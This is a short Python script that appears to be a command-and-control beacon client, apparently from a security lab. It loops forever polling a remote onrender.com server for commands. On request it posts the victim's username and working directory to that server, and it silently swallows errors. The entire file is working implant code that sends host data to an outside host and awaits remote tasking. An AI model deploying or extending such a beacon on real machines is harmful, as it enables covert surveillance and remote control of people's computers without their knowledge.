import requests
import time
import os
import getpass

SERVER = "https://cyber-security-lab-fvy8.onrender.com"

client_id = getpass.getuser() + "_" + str(os.getpid())

def get_command():
    try:
        r = requests.get(SERVER + "/get_command")
        return r.text
    except:
        return "none"

def send_info():
    data = {
        "id": client_id,
        "user": getpass.getuser(),
        "cwd": os.getcwd()
    }

    try:
        requests.post(SERVER + "/report", json=data)
    except:
        pass

while True:
    cmd = get_command()
    print("📥 收到指令:", cmd)

    if cmd == "info":
        send_info()

    time.sleep(5)
